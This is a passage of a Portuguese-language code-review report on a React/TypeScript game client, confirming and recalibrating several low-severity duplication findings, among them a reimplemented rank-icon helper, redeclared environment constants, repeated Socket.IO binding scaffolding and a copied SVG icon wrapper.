- **Notas do verificador:** Achado CONFIRMADO como duplication-componentization, mas com duas correcoes ao relato do autor: (a) o "bloco avatar-com-fallback aparece em 4 arquivos" e exagero — o bloco img/inicial so existe em Leaderboard.tsx e MiniLeaderboard.tsx; PlayerCard.tsx:43 e WaitingRoom.tsx:297 tem apenas o snippet charAt(0).toUpperCase() sobre um tipo Player sem avatar_url, entao nao sao candidatos ao mesmo componente de avatar. (b) severidade P2 -> P3: e cheiro de manutenibilidade sem impacto de runtime nem bug funcional. A divergencia (span com guarda '||?' vs texto solto sem guarda) e cosmetica e ainda nao produziu defeito. Refactor legitimo: extrair <AvatarWithFallback avatarUrl name/> e um tipo LeaderboardEntry compartilhado (+ hook useLeaderboard) para Leaderboard.tsx e MiniLeaderboard.tsx; PlayerCard/WaitingRoom ficam de fora do escopo do avatar-com-imagem. Confianca "high" do autor procede sobre o nucleo (interface+fetch+row duplicados entre os 2 leaderboards), so nao sobre o escopo de 4 arquivos.

### [P3] getRankIcon reimplementado inline no MiniLeaderboard apesar de existir em utils/helpers
- `src/client/src/components/home/MiniLeaderboard/MiniLeaderboard.tsx:46` · duplication-componentization · **CONFIRMED**
- **Evidência:** // MiniLeaderboard.tsx:46
const getRankIcon = (position: number) => {
  if (position === 1) return '🥇';
  if (position === 2) return '🥈';
  if (position === 3) return '🥉';
  return `#${position}`;
};

// utils/helpers.ts:26 - identico e ja usado por Leaderboard.tsx (import getRankIcon)
export const getRankIcon = (rank: number): string => {
  if (rank === 1) return '🥇'; if (rank === 2) return '🥈'; if (rank === 3) return '🥉'; return `#${rank}`;
};
- **Repro/verificação:** Trace confirmado no repo: (1) utils/helpers.ts:26 exporta getRankIcon(rank:number) -> 🥇/🥈/🥉/`#rank`. (2) pages/Leaderboard/Leaderboard.tsx:13 importa `getRankIcon` de '../../utils/helpers' e usa em L187. (3) components/home/MiniLeaderboard/MiniLeaderboard.tsx:46 redefine a MESMA logica inline (const getRankIcon(position)) e usa em L80. Duas fontes da mesma verdade. Prova extra: MiniLeaderboard.tsx:7 ja importa `getRankColor` do MESMO modulo '../../../utils/helpers', logo dedupe = adicionar `getRankIcon` a linha de import ja existente. Repro do impacto: trocar o esquema de icones em helpers.ts (ex.: emoji->componente SVG) atualiza Leaderboard mas NAO o MiniLeaderboard, que continua servindo emoji.
- **Notas do verificador:** Real e reproduzivel por leitura estatica. Unica ressalva a evidencia: NAO e "identico byte-a-byte" como alegado — a copia inline renomeia o parametro (rank->position), remove a anotacao de retorno `: string` e o `export const`. Comportamento e identico; a substancia (duplicacao de single-source-of-truth de medalha por posicao) esta 100% correta. Severidade P3 esta certa: puro DRY/manutenibilidade, sem impacto de runtime, correcao ou seguranca. Confianca 'high' justificada. Fix trivial: importar getRankIcon na linha 7 (junto de getRankColor) e apagar as linhas 46-51.

### [P3] Constantes de ambiente GAME_CODE/ADMIN_API_URL redeclaradas em multiplos arquivos
- `src/client/src/components/home/Changelog/Changelog.tsx:18` · duplication-componentization · **CONFIRMED**
- **Evidência:** // config/index.ts:6 (canonico)
export const GAME_CODE = import.meta.env.VITE_GAME_CODE || 'BANGSHOT';
export const ADMIN_API_URL = import.meta.env.VITE_ADMIN_API_URL || '';

// redeclarado em:
// components/home/Changelog/Changelog.tsx:18-19
const GAME_CODE = import.meta.env.VITE_GAME_CODE || 'BANGSHOT';
const ADMIN_API_URL = import.meta.env.VITE_ADMIN_API_URL || '';
// context/AdsContext.tsx:64-65 (mesmas duas linhas)
// context/AuthContext.tsx:45 const GAME_CODE = import.meta.env.VITE_GAME_CODE || 'BANGSHOT';
- **Repro/verificação:** Redeclaracao real e verificada. config/index.ts ja exporta os canonicos: GAME_CODE (:6, default 'BANGSHOT') e ADMIN_API_URL (:10, default ''). Mesmo assim sao redeclarados localmente (nao importados) em: Changelog.tsx:18-19 (GAME_CODE + ADMIN_API_URL default ''), AdsContext.tsx:64-65 (ADMIN_API_URL default 'https://admin.mysys.shop' + GAME_CODE), AuthContext.tsx:45 (GAME_CODE) e ainda um 4o ponto inline em AdBanner.tsx:135 (VITE_ADMIN_API_URL || ''). O padrao de importar do config existe e e usado corretamente por LegalPage.tsx, ChangelogPage.tsx, BugReportModal.tsx, SocketContext.tsx e Home.tsx — logo a duplicacao e evitavel, nao necessaria. Efeito concreto do default divergente: com VITE_ADMIN_API_URL NAO setado no mesmo build, Changelog.fetchChangelog ve ADMIN_API_URL==='' e curto-circuita (setError('API nao configurada'), nenhum fetch), enquanto AdsContext.fetchPlacements ve ADMIN_API_URL==='https://admin.mysys.shop' e dispara request pra API de producao. Mesmo conceito, dois comportamentos.
- **Notas do verificador:** Achado factualmente correto e ate subestimado (existe um 4o local, AdBanner.tsx:135). Nao e vuln de seguranca nem bug de correcao em producao (onde VITE_ADMIN_API_URL e injetado em build-time e tudo resolve igual); a divergencia so aparece quando a env var esta ausente (dev/local sem .env). Por isso P3 (duplicacao/manutenibilidade com pequena inconsistencia comportamental) esta certo — nao inflar. Fix: importar { GAME_CODE, ADMIN_API_URL } de config em Changelog/AdsContext/AuthContext/AdBanner e remover os default divergentes.

### [P3] Scaffold de binding de eventos Socket.IO duplicado em 3 hooks
- `src/client/src/hooks/multiplayer/useRoomEvents.ts:64` · duplication-componentization · **CONFIRMED**
- **Evidência:** // mesma estrutura em useRoomEvents.ts:64, useLobbyEvents.ts:62 e useGameEvents.ts (handlersRef em 68/66/115)
const handlersRef = useRef(handlers);
handlersRef.current = handlers;
useEffect(() => {
  if (!socket) return;
  const handleX = (data) => { handlersRef.current.onX?.(data); }; // repetido por evento
  ...
  socket.on('playerJoined', handlePlayerJoined); ... // N linhas
  return () => { socket.off('playerJoined', handlePlayerJoined); ... }; // N linhas espelhadas
}, [socket]);
- **Repro/verificação:** Duplicacao factual e verificada nos 3 arquivos. Scaffold identico: (1) `const handlersRef = useRef(handlers); handlersRef.current = handlers;` em useRoomEvents.ts:68-69, useLobbyEvents.ts:66-67, useGameEvents.ts:115-116; (2) `useEffect(() => { if (!socket) return; ... }, [socket])` em todos; (3) por evento um wrapper `const handleX = (data) => handlersRef.current.onX?.(data)`; (4) um bloco `socket.on(...)` (useRoomEvents 132-144 / useLobbyEvents 122-132 / useGameEvents 196-212) espelhado por um bloco `socket.off(...)` (useRoomEvents 148-160 / useLobbyEvents 136-146 / useGameEvents 216-232). Grep confirma 43 usos de `handlersRef.current` (14+11+18). Nenhum helper compartilhado existe (grep por useSocketEvents/bindSocketEvents/EventMap = 0 resultados). E extraivel para um `useSocketEvents(socket, handlerMap)` generico. Todas as linhas citadas pelo autor (64/68, 62/66, 111/115) e a contagem (43) batem exatamente.
- **Notas do verificador:** Achado de duplication-componentization, nao de seguranca — os angulos de authz/policy/validacao/transacao nao se aplicam. Nucleo do achado (duplicacao mecanica real e precisamente quantificada em 3 hooks, sem abstracao) e verdadeiro e nao refutavel: verifiquei cada linha e a contagem de 43. Rebaixei P2->P3 porque o impacto de 'memory leak / handler duplicado' e apenas hipotetico/futuro: conferi que HOJE todos os on/off estao simetricos (useRoomEvents 13/13, useLobbyEvents 11/11, useGameEvents 17/17) — nao ha vazamento ativo. E puro cleanup/manutenibilidade sem defeito corrente; a moldura de 'memory leak' inflou levemente a severidade. Fix natural: extrair um hook generico tipado que recebe um mapa evento->chave-de-handler e faz on/off automaticamente, eliminando ~120 linhas de boilerplate e o risco de esquecer um off.

### [P3] Wrapper SVG identico copiado em ~130 arquivos de icone
- `src/client/src/components/icons/ui/BugIcon.tsx:6` · duplication-componentization · **CONFIRMED**
- **Evidência:** // repetido em ~130 arquivos icons/**/*.tsx (ex.: BugIcon.tsx:6 e CameraIcon.tsx:6, identicos exceto os paths internos)
export function BugIcon({ size, color = DEFAULT_ICON_COLOR, className, style, title }: IconProps) {
  const s = getIconSize(size);
  return (
    <svg width={s} height={s} viewBox="0 0 24 24" fill={color} className={className} style={style}
      aria-hidden={!title} role={title ? 'img' : undefined}>
      {title && <title>{title}</title>}
      ... // <-- unica parte que varia entre os icones
    </svg>
  );
}
- **Repro/verificação:** Duplicacao real e verificavel por leitura direta. BugIcon.tsx linhas 3-16 e CameraIcon.tsx linhas 3-16 sao um wrapper IDENTICO: mesma assinatura `{ size, color = DEFAULT_ICON_COLOR, className, style, title }: IconProps`, mesmo `const s = getIconSize(size)`, e o mesmo bloco `<svg width={s} height={s} viewBox="0 0 24 24" fill={color} className={className} style={style} aria-hidden={!title} role={title ? 'img' : undefined}>{title && <title>{title}</title>}` — so a geometria interna (<path>/<circle>) muda. Esse wrapper exato se repete em 101 de 128 arquivos icons/**/*.tsx (grep -rl 'aria-hidden={!title}' = 101). Existe Icon.tsx mas ele so exporta o TIPO IconProps + getIconSize + DEFAULT_ICON_COLOR + ICON_SIZES; NAO existe componente-wrapper, entao o boilerplate esta genuinamente copiado. Consequencia confirmada: adicionar focusable={false} / mudar viewBox padrao / mudar comportamento de title exige editar ~100 arquivos.

DIVERGENCIA confirmada, porem o exemplo literal do autor esta ERRADO: a string exata `stroke="currentColor"` aparece 0 vezes na arvore de icones. A divergencia real (e ate pior): os 25 icones de achievements (ex.: SniperIcon.tsx:8-16) usam OUTRA familia de wrapper — viewBox="0 0 48 48", fill="none", e um padrao de acessibilidade TOTALMENTE diferente (`aria-label={title || 'Atirador de Elite'}` SEM <title>, sem role, sem aria-hidden) e abandonam a prop `color`, hardcodando #ef4444. Ou seja, duas convencoes de a11y ja coexistem no set de icones, o que sustenta o ponto "ja ha divergencia".
- **Notas do verificador:** Finding de qualidade/manutencao (duplication-componentization), nao ha superficie de seguranca (rota/authz/validacao/transacao) a tracar — categoria correta. Nucleo do achado CONFIRMED: wrapper SVG copiado em 101/128 icones, sem componente-wrapper compartilhado (Icon.tsx so tem tipos+helpers). Impacto de manutencao real. UNICA imprecisao do autor: o exemplo `stroke="currentColor"` nao existe (0 ocorrencias); a divergencia verdadeira e `fill="none"` + `aria-label` (vs `aria-hidden`/`role`/`<title>`) nos 25 icones de achievements — isso reforca, nao refuta, o achado. Severidade P3/confianca medium esta calibrada corretamente; nao exagerou nem subestimou. Correcao sugerida: extrair um <IconBase>/<Svg> em Icon.tsx recebendo children + viewBox e centralizar a11y; unificar as duas familias (24x24 aria-hidden vs 48x48 aria-label).
